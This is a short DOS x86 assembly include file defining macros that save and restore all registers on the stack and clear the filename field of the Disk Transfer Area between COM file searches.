;----------------------------------------------------------------------------
; SaveRegisters
;----------------------------------------------------------------------------
; Description: Saves the contents of all the registers on the stack
; Arguments:  <none>
; Registers Destroyed: <none>
SaveRegisters MACRO
push ax
push bx
push cx
push dx
push es
push ds
push si
push di
push bp
pushf
ENDM
;----------------------------------------------------------------------------
; RestoreRegisters
;----------------------------------------------------------------------------
; Description: Restores the contents of all the registers from the stack
; Arguments: <none>
; Registers Destroyed: ax, bx, cx, dx, es, ds, si, di, bp, flags
RestoreRegisters MACRO
popf
pop bp
pop di
pop si
pop ds
pop es
pop dx
pop cx
pop bx
pop ax
ENDM
;----------------------------------------------------------------------------
; eraseDTA
;----------------------------------------------------------------------------
; Description: Deletes the previous DTA for the next COM file search
; Arguments:  DTA address Assigned to a variable reserved for him
; Registers Destroyed: <none>
eraseDTA MACRO
mov di,OFFSET DTA+30    ; ES:DI points to DTA
mov cx,13       ; length of filename
xor al,al       ; fill with zeros
rep stosb       ; erase DTA
ENDM


